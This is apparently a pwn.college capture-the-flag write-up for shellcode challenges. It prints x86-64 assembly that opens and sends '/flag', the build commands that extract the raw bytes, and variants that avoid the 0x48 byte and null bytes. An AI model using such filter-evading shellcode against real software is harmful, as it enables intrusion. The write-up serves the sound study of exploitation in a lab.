# pwn.college
## CSE466
### Shell
#### 1 - 2

We are asked to receive the flag in '/flag'. First, we write the assembly code corresponding to the shellcode that we want to generate:

```asm
.global _start


_start:
  movq $2, %rax  # open()
  leaq flag(%rip), %rdi # RIP relative addressing
  movq $0, %rsi
  movq $0, %rdx
  syscall
  
  movq %rax, %rsi
  movq $40, %rax # syscall sendfile
  movq $1, %rdi
  movq $0, %rdx
  movq $1000, %r10
  syscall

flag: .asciz "/flag"
```

Than, we need to compile it and dump its `.text` section with `objcopy`:

```
gcc -no-pie -nostdlib -o 1 1.s
objcopy -O binary --only-section=.text 1 1.raw
```

Now, all we need to do is provide this 1.raw as input to the binary and we get the flag!

#### 3
This challenge forbids us from using the H(0x48) byte in our shellcode. Unfortunately, this is the byte for the [REX](https://wiki.osdev.org/X86-64_Instruction_Encoding#REX_prefix) prefix, which is necessary when you use 64 bit operands with operations that don't support it.


Thankfully, push and pop can do long-mode operations without using the REX prefix, so we can use them instead of mov. But this removes our ability to do rip relative addressing. Here is the code that should achieve that:

```
#
# 1.s
# Shell
#
# Created by Yigit Colakoglu on 09/26/21.
# Copyright 2021. Yigit Colakoglu. All rights reserved.
#

.global _start


_start:
  pushq $2
  popq %rax
  pushq $0x1337025
  popq %rdi
  pushq $0
  popq %rsi
  pushq $0
  popq %rdx
  syscall
  
  pushq %rax
  popq %rsi
  pushq $40
  popq %rax
  pushq $1
  popq %rdi
  pushq $0
  popq %rdx
  pushq $1000
  popq %r10
  syscall

flag: .asciz "/flag"
```

#### 4 
This time, we can't use the 0x00 byte in our shellcode. Thankfully, we don't have to. We can't use `xor` to zero registers and some other tricks. Here is the assembly solution for that:

```assembly
#
# 1.s
# Shell
#
# Created by Yigit Colakoglu on 09/26/21.
# Copyright 2021. Yigit Colakoglu. All rights reserved.
#

.global _start


_start:
  pushq $2
  popq %rax
  pushq $0x1337026
  popq %rdi
  xor %rsi, %rsi
  xor %rdx, %rdx
  syscall
  
  pushq %rax
  popq %rsi
  pushq $40
  popq %rax
  pushq $1
  popq %rdi
  xor %rdx, %rdx
  xor %r10, %r10
  movw $1000, %r10w
  syscall

flag: .ascii "/flag"
```